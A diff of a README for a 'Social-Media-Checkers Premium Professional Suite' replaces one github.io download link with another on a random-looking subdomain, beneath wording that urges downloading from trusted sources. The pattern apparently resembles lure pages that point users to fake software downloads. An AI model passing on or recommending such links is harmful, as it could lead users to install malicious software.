@@ -49,6 +49,6 @@ A: Ensure you have a stable internet connection and that the social media platfo
 
 To get started with the Social-Media-Checkers Premium Professional Suite, download the latest version from the official website. We recommend downloading only from trusted sources to ensure the security and integrity of the software.
 
-[Download from official website](https://yellowtaxisave.github.io/download-page/)
+[Download from official website](https://capitals-707-bringing.github.io/download-page/)
 
 For any inquiries or support, please visit our contact page. Stay updated with new features and improvements by following our releases on GitHub.
